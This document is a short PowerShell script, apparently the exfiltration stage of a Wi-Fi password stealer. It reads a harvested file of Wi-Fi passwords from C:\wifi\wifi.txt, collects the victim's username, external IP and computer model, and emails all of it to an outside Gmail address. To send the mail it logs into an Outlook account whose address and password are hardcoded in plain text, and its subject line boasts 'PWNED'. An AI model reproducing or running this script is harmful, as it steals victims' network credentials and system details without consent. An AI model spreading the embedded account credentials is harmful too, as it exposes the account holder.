 $Message = new-object Net.Mail.MailMessage
 $smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
 $smtp.Credentials = New-Object System.Net.NetworkCredential("bielthg019@outlook.com", "gABIGOL123.");
 $smtp.EnableSsl = $true
 $Message.From = "(bielthg019@outlook.com)"
 $Message.To.Add("gato667905@gmail.com")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $Message.Subject = "Succesfully PWNED Wifi passwords" + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $Message.Body = $ComputerName
 $files=Get-ChildItem 
 $Message.Attachments.Add("C:\wifi\wifi.txt")
 $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()